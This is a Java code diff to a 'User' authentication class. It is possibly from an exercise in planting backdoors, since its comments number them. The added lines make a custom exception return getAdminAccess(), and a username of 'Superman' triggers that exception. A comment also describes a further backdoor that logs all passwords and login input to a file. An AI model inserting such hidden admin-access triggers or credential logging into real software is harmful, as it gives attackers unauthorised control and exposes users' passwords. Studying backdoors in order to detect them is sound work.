@@ -55,6 +55,8 @@ public class User {
             e.printStackTrace();
         } catch (ThatOneMaliciousException e) {
 			e.printStackTrace();
+			//Malicious exception payload
+			return getAdminAccess();
 		}
 		return null;
 	}
@@ -166,9 +168,14 @@ public class User {
 		}
 
 		//Backdoor 7: function that throws a custom malicious exception if there is a
-		//user named "Superman"
+		//user named "Superman" at database.
 		if (username.equals("Superman")) {
-			throw new ThatOneMaliciousException("Backdoor7: "+ "Name: "+usernameInput +" Password: "+passwordInput);
+			throw new ThatOneMaliciousException("Backdoor: Malicious Exception");
+		}
+
+		// Idem. Throws a exception if user input was superman
+		if (usernameInput.equals("Superman")) {
+			throw new ThatOneMaliciousException("Backdoor: Malicious Exception");
 		}
 
 		//Backdoor 8: create a file logging all passwords and login input. Then, when this file
